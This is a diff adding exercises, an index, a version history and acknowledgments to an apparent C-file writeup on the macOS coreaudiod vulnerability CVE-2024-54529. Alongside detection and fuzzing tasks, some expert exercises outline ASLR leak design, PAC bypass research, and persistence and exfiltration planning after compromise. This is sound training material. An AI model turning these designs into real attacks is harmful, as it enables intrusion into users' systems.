+ * │   • Research directions                                                 │
+ * │   • Advanced analysis                                                   │
+ * └─────────────────────────────────────────────────────────────────────────┘
  *
  * This appendix is for researchers who find 10+ 0days per year.
  * Skip the metaphors. Here's what you actually need to know.
@@ -17323,6 +20065,15 @@ int main(int argc, char *argv[]) {
  * =============================================================================
  * APPENDIX B: LIVE EXPERIMENTS - DEEP DIVE WITH EXPLANATIONS
  * =============================================================================
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ AUDIENCE: Beginner -> Expert (tiered)                                   │
+ * │ PREREQUISITES: macOS, terminal, optional sudo                           │
+ * │ LEARNING OBJECTIVES:                                                    │
+ * │   • Hands-on exploration                                                │
+ * │   • Reproduce analysis                                                  │
+ * │   • Practical skills                                                    │
+ * └─────────────────────────────────────────────────────────────────────────┘
  *
  * These experiments were run on macOS 26.2 (Build 25C56) ARM64.
  * For each command, I explain:
@@ -18664,6 +21415,287 @@ int main(int argc, char *argv[]) {
  * └─────────────────────────────────────────────────────────────────────────────┘
  *
  * ═══════════════════════════════════════════════════════════════════════════
+ * ADDITIONAL EXERCISES BY DIFFICULTY LEVEL
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ BEGINNER EXERCISES (New Additions)                                      │
+ * └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * EXERCISE B1: BASELINE OBSERVATION
+ *   Run all Appendix B commands on your own Mac and document what you see.
+ *   Compare your output to the examples. What's different? Why?
+ *
+ *   Deliverable: A markdown file with your observations and screenshots.
+ *
+ * EXERCISE B2: YARA RULE MODIFICATION
+ *   The YARA rule detects heap spray patterns. Modify it to detect:
+ *   a) A different string pattern in the plist
+ *   b) Files larger than 10MB instead of 5MB
+ *   Test your modified rule against sample plists.
+ *
+ *   Deliverable: Modified YARA rule with test results.
+ *
+ * EXERCISE B3: NORMAL BEHAVIOR BASELINE
+ *   Use `log stream` to capture coreaudiod activity for 10 minutes during:
+ *   a) No audio activity
+ *   b) Playing music
+ *   c) Video call
+ *   Document the differences in log patterns.
+ *
+ *   Deliverable: Comparison table of log patterns.
+ *
+ * EXERCISE B4: ENTITLEMENT EXPLORATION
+ *   List entitlements for 5 different system daemons using codesign.
+ *   Which ones have "rootless" entitlements? Which are sandboxed?
+ *
+ *   Deliverable: Table comparing daemon privileges.
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ INTERMEDIATE EXERCISES (New Additions)                                  │
+ * └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * EXERCISE I1: MIG MESSAGE PARSER
+ *   Write a Python script that:
+ *   a) Reads a raw Mach message binary
+ *   b) Parses the mach_msg_header_t
+ *   c) Extracts and displays the message ID
+ *   d) Decodes inline data based on NDR format
+ *
+ *   Test with captured messages from the exploit.
+ *   Deliverable: Working Python script with sample output.
+ *
+ * EXERCISE I2: FRIDA HOOK
+ *   Write a Frida script to hook HALS_ObjectMap::CopyObjectByObjectID:
+ *   a) Log every call with object_id argument
+ *   b) Log the returned object type (FourCC)
+ *   c) Track which handlers call it most frequently
+ *
+ *   Run during normal audio operation.
+ *   Deliverable: Frida script + analysis of call patterns.
+ *
+ * EXERCISE I3: HEAP SPRAY VISUALIZATION
+ *   Create a visualization (Python + matplotlib or similar) showing:
+ *   a) Heap state before spray
+ *   b) Allocations during spray (color-coded by size)
+ *   c) Hole creation
+ *   d) Target allocation landing
+ *
+ *   Use data from `heap` command captures.
+ *   Deliverable: Animated or multi-frame visualization.
+ *
+ * EXERCISE I4: COVERAGE ANALYSIS
+ *   Using the Jackalope fuzzer (or similar):
+ *   a) Fuzz coreaudiod for 1 hour
+ *   b) Capture coverage data
+ *   c) Identify which handlers were NOT reached
+ *   d) Analyze why and propose corpus improvements
+ *
+ *   Deliverable: Coverage report with recommendations.
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ ADVANCED EXERCISES (New Additions)                                      │
+ * └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * EXERCISE A1: INDEPENDENT VARIANT DISCOVERY
+ *   Without looking at the patch diff:
+ *   a) Extract CoreAudio from dyld cache
+ *   b) Find all __XIOContext_* handlers
+ *   c) For each, check if it validates object type before use
+ *   d) Document your findings
+ *
+ *   Compare your results to the known 6 vulnerable handlers.
+ *   Deliverable: Static analysis report with methodology.
+ *
+ * EXERCISE A2: NEW MIG SERVICE HARNESS
+ *   Choose a different MIG service (e.g., WindowServer, tccd, syslogd):
+ *   a) Identify the Mach service name
+ *   b) Enumerate message handlers
+ *   c) Write a basic fuzzing harness
+ *   d) Run for 1 hour and report any crashes
+ *
+ *   Deliverable: Working harness + crash report (if any).
+ *
+ * EXERCISE A3: ASLR INFORMATION LEAK
+ *   Design (and optionally implement) an information leak to make the
+ *   exploit reliable without knowing the dyld cache slide:
+ *   a) Identify potential leak sources in coreaudiod
+ *   b) Design a message sequence to trigger the leak
+ *   c) Calculate how to derive gadget addresses from leaked values
+ *
+ *   Deliverable: Technical writeup with leak design.
+ *
+ * EXERCISE A4: PATCH DIFF ANALYSIS
+ *   Obtain vulnerable and patched CoreAudio binaries:
+ *   a) Extract from macOS 15.1 and 15.2 installers
+ *   b) Use BinDiff or Diaphora to compare
+ *   c) Document exactly what changed in each vulnerable handler
+ *   d) Identify if any bugs were missed in the patch
+ *
+ *   Deliverable: Detailed patch analysis report.
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ EXPERT EXERCISES (New Additions)                                        │
+ * └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * EXERCISE E1: ARM64 THEORETICAL EXPLOIT
+ *   Design (do NOT implement) an ARM64 version of this exploit:
+ *   a) Identify how PAC affects each step
+ *   b) Research potential PAC bypasses applicable to this context
+ *   c) Design a hypothetical exploit flow
+ *   d) Estimate difficulty and required primitives
+ *
+ *   Deliverable: Technical design document (theoretical only).
+ *
+ * EXERCISE E2: NEW TYPE CONFUSION HUNT
+ *   Using the methodology from this case study:
+ *   a) Choose another daemon with HALS-like object management
+ *   b) Identify object lookup functions
+ *   c) Audit for missing type checks
+ *   d) Document any potential type confusion bugs (report responsibly!)
+ *
+ *   Deliverable: Audit methodology + findings (sanitized if needed).
+ *
+ * EXERCISE E3: KERNEL DETECTOR DEVELOPMENT
+ *   Design a kernel-level detector for this bug class:
+ *   a) What syscalls/operations indicate exploitation?
+ *   b) How could a kext detect heap spray patterns?
+ *   c) What about detecting the type confusion itself?
+ *   d) Consider performance implications
+ *
+ *   Deliverable: Detector design document with pseudocode.
+ *
+ * EXERCISE E4: EXPLOIT CHAIN EXTENSION
+ *   Assuming successful coreaudiod compromise, design:
+ *   a) Persistence mechanism using coreaudiod's capabilities
+ *   b) Data exfiltration channel
+ *   c) Pivot to kernel exploitation (theoretical)
+ *
+ *   Deliverable: Post-exploitation playbook (defensive purpose only).
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * =============================================================================
+ * CROSS-REFERENCE INDEX
+ * =============================================================================
+ *
+ * This index helps you find specific topics by line number reference.
+ * (Line numbers are approximate and may shift with edits.)
+ *
+ * -----------------------------------------------------------------------------
+ * INDEX OF KEY CONCEPTS
+ * -----------------------------------------------------------------------------
+ *
+ *   ASLR (Address Space Layout Randomization)
+ *     - Overview and bypass ..................... Section I.1
+ *     - dyld shared cache slide ................. lines 18167-18200
+ *     - Practical bypass strategy ............... Appendix B, Experiment 10
+ *
+ *   Audit Token
+ *     - Structure definition .................... lines 438-454
+ *     - How kernel attaches to messages ......... lines 426-430
+ *     - Sandbox checking ........................ lines 452-454
+ *
+ *   Heap Spray
+ *     - Overview ................................ lines 3200-3210
+ *     - "Parking Lot" analogy ................... lines 17940-17975
+ *     - Mathematical calculation ................ [new section]
+ *     - libmalloc magazine internals ............ [new section]
+ *
+ *   Mach IPC
+ *     - Port fundamentals ....................... lines 219-277
+ *     - Message structure ....................... lines 381-396
+ *     - mach_msg() parameters ................... [new section]
+ *
+ *   PAC (Pointer Authentication)
+ *     - Overview ................................ Part 8
+ *     - Key types ............................... Part 8.2
+ *     - Bypass approaches ....................... Part 8.4
+ *
+ *   ROP (Return-Oriented Programming)
+ *     - Why it works ............................ lines 3430-3460
+ *     - Gadget selection ........................ [new section]
+ *     - Stack layout ............................ lines 3530-3560
+ *
+ *   Type Confusion
+ *     - First principles ........................ lines 2500-2600
+ *     - Dog vs BankAccount analogy .............. search "Dog"
+ *     - HALS objects ............................ lines 3260-3350
+ *     - Offset 0x68 analysis .................... lines 3255-3390
+ *
+ * -----------------------------------------------------------------------------
+ * INDEX OF COMMANDS (from Appendix B)
+ * -----------------------------------------------------------------------------
+ *
+ *   codesign -d --entitlements .................. Experiment 2
+ *   heap (process analysis) ..................... Experiment 9
+ *   ipsw dyld extract ........................... Experiment 4
+ *   launchctl print ............................. Experiment 1
+ *   log show / log stream ....................... Experiment 8
+ *   nm (symbol listing) ......................... Experiment 5
+ *   ROPgadget ................................... Experiment 7
+ *   sandbox profile cat ......................... Experiment 3
+ *   vmmap ....................................... Experiment 10
+ *
+ * -----------------------------------------------------------------------------
+ * INDEX OF DATA STRUCTURES
+ * -----------------------------------------------------------------------------
+ *
+ *   audit_token_t ............................... lines 438-450
+ *   Engine (HALS_Engine) ........................ lines 3292-3315
+ *   HALS_Object ................................. lines 3264-3272
+ *   IOContext (HALS_IOContext) .................. lines 3264-3288
+ *   ipc_port .................................... lines 255-269
+ *   mach_msg_header_t ........................... lines 381-396
+ *   task_t ...................................... lines 532-543
+ *
+ * =============================================================================
+ * DOCUMENT VERSION HISTORY
+ * =============================================================================
+ *
+ *   VERSION   DATE         CHANGES
+ *   ───────   ──────────   ─────────────────────────────────────────────────
+ *   1.0       2025-01-XX   Initial comprehensive writeup
+ *                          - CVE-2024-54529 full documentation
+ *                          - XNU architecture deep dive
+ *                          - Exploitation details
+ *
+ *   1.1       2025-01-XX   Added Feynman-style first-principles explanations
+ *                          - "Memory is just bytes" foundation
+ *                          - Dog vs BankAccount analogy
+ *                          - CPU execution explanation
+ *                          - Magazine letter ROP analogy
+ *
+ *   1.2       2025-01-XX   Added Appendix B: Live Experiments
+ *                          - Real command outputs from macOS 26.2
+ *                          - Hands-on exercises at multiple levels
+ *                          - WHY/HOW/WHAT explanations for each command
+ *
+ *   1.3       2025-01-31   ESR Enhancement Update
+ *                          - Added PART 8: ARM64/PAC deep dive
+ *                          - Added gadget selection methodology
+ *                          - Added audience labels to all sections
+ *                          - Added "How to Read This Document" guide
+ *                          - Added libmalloc magazine internals
+ *                          - Added complete HALS FourCC codes
+ *                          - Added Common Mistakes sections
+ *                          - Added enhanced exercises
+ *                          - Added cross-reference index
+ *                          - Created parallel markdown documentation
+ *
+ * =============================================================================
+ * ACKNOWLEDGMENTS
+ * =============================================================================
+ *
+ *   Dillon Franke (Google Project Zero) - Original vulnerability research
+ *   Google Project Zero - Fuzzing infrastructure, responsible disclosure
+ *   Brandon Falk (@gamozolabs) - Fuzzing methodology inspiration
+ *   Sergei Glazunov - iOS/macOS exploitation techniques
+ *   Clement Lecigne (Google TAG) - Detection methodology
+ *   Manfred Paul - Type confusion expertise
+ *   Eric S. Raymond - Documentation review and suggestions
+ *
+ * =============================================================================
  *
  * =============================================================================
  * END OF COMPREHENSIVE VULNERABILITY RESEARCH CASE STUDY
